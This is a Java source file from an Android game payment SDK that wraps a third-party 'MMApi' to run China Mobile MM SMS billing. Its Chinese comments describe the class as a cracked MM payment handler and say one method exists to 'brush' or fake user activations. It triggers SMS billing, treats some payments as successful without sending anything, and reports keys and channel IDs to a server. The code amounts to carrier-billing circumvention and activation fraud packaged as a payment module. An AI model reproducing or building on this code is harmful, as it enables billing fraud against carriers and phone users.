package mobi.zty.pay.sdk.ananFee;

import java.util.HashMap;
import java.util.Map;

import mm.api.MMApiException;
import mm.api.SMSResponse;
import mm.api.android.MMApi;
import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.Util_G;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;

/**
 * mm网络破解支付管理类
 * @author Administrator
 *
 */
public class AnAnFeeInstance extends PaymentInterf{
	private static AnAnFeeInstance instance;
	private Handler callBHandler = null;
	private Map<String, SMSResponse> mapSmsResponse = new HashMap<String, SMSResponse>();
	private String payCode;
	private Map<String, Boolean> appKeyInitMap = new HashMap<String, Boolean>();
	public static AnAnFeeInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized AnAnFeeInstance scyMMpay(){
		if(instance==null){
			instance =  new AnAnFeeInstance();
		}
		return instance;
	}
	@Override
	public void init(final Context context, Object... parameters) {
		if (callBHandler==null) {
			callBHandler = (Handler) parameters[0];
		}
		FeeInfo info = (FeeInfo) parameters[1];
		final String appKey = info.sdkPayInfo.spKey;
		final String channelId = info.sdkPayInfo.spChannel;
		if (appKeyInitMap.containsKey(appKey)&&appKeyInitMap.get(appKey)) {//不需要重复的刷用户
			return;
		}
		activeMMUser(context, appKey, channelId,null);

	}
	/**
	 * 主要用于刷用户
	 * @param context
	 * @param appKey
	 * @param channelId
	 * @param type
	 */
	private synchronized void  activeMMUser(final Context context, final String appKey,
			final String channelId,final FeeInfo feeInfo) {
		appKeyInitMap.put(appKey, true);//一进来 就设置为 激活成功
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					MMApi.appStart((Activity) context, appKey, channelId);
					Util_G.debugE("init", "anan init succ! "+appKey);
					if (feeInfo != null) {
						realyPay(context, feeInfo.orderId,feeInfo);
					}
				} catch (MMApiException e) {
					appKeyInitMap.put(appKey, false);
					if (feeInfo != null) {
						notiFyResult(PayConfig.SP_INIT_FAIL,"anan初始化失败",feeInfo.orderId);
					}
					e.printStackTrace();
				}
			}
		}).start();
	}
	
	/**
	 * 支付结果通知 
	 * @param sendSucc 1成功
	 */
	@Override
	public void notifyPay(Object... parameters){
		final int sendSucc = (Integer) parameters[0];
		final String orderId = (String) parameters[1];
		final FeeInfo feeInfo = GameSDK.getInstance().getFeeInfoByOrderId(orderId);
		if (feeInfo==null) return;
		SMSResponse response = mapSmsResponse.get(orderId);
		if (response == null) return;
		switch (sendSucc) {
		case 1://支付成功
			response.sendMessageSuccess();
			Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, "通知anan支付成功!", feeInfo.orderId);
			break;
		default://支付失败
			response.sendMessageFailed();
			Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, "通知anan支付失败!",  feeInfo.orderId);
			break;
		}
		mapSmsResponse.remove(feeInfo.orderId);
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		
		final FeeInfo feeInfo = (FeeInfo) parameters[0];
		if (feeInfo==null||feeInfo.sdkPayInfo==null) {
			notiFyResult(PayConfig.SDK_INFO_NULL, "后台没给计费点","");
			Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, "后台没给计费点", feeInfo.orderId);
			return;
		};
		final String appKey = feeInfo.sdkPayInfo.spKey;
		Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, "进入支付", feeInfo.orderId);
		if (!(appKeyInitMap.containsKey(appKey)&&appKeyInitMap.get(appKey))) {
			Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, "另一套计费需要重新初始化", feeInfo.orderId);
			activeMMUser(context, appKey, feeInfo.sdkPayInfo.spChannel, feeInfo);
		}else{
			realyPay(context, feeInfo.orderId,feeInfo);
		}
		
	}
	private void notiFyResult(int resutCode,String retMsg,String orderId) {
		PayResultInfo info = new PayResultInfo();
		info.resutCode = resutCode;
		info.retMsg = retMsg;
		info.orderId = orderId;
		Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
		message.obj = info;
		message.sendToTarget();
	}
	private void realyPay(final Context context, final String orderId, final FeeInfo feeInfo) {
		payCode = feeInfo.sdkPayInfo.payCode;
		final String appID = feeInfo.sdkPayInfo.appId;
		payCode=String.format("%s%02d", appID,Integer.parseInt(payCode));
		Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, "参数没问题执行支付payCode="+payCode+"appkey="
		+feeInfo.sdkPayInfo.spKey+"channelId="+feeInfo.sdkPayInfo.spChannel, "00000000000");
		new Thread(new Runnable() {
			@Override
			public void run() {
				PayResultInfo info = new PayResultInfo();
				info.orderId = feeInfo.orderId;
				try {
					SMSResponse response = MMApi.getSms(context, feeInfo.sdkPayInfo.spKey, Long.parseLong(payCode),
							feeInfo.sdkPayInfo.spChannel, feeInfo.orderId);
					mapSmsResponse.put(feeInfo.orderId, response);
					if (!response.isMustSend()) {
						notiFyResult(PayConfig.BIIL_SUCC, "强联网没必要发送短信 视为成功", feeInfo.orderId);
						Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, info.retMsg, feeInfo.orderId);
						notifyPay(1,feeInfo.orderId);
					}else{
						Intent itSend = new Intent("SENT_SMS_ACTION");  
						itSend.putExtra("order_id", feeInfo.orderId);
				        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
				        response.requestSendMessage(mSendPI, null);
				        Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, "发送短start", feeInfo.orderId);
					}
			        
				} catch (Exception e) {
					info.resutCode = PayConfig.SP_PAY_EXPTION;
					info.retMsg = e.getMessage();
					Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
					message.obj = info;
					message.sendToTarget();
					Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, info.retMsg, info.orderId);
					e.printStackTrace();
				}
			}
		}).start();
	}
}
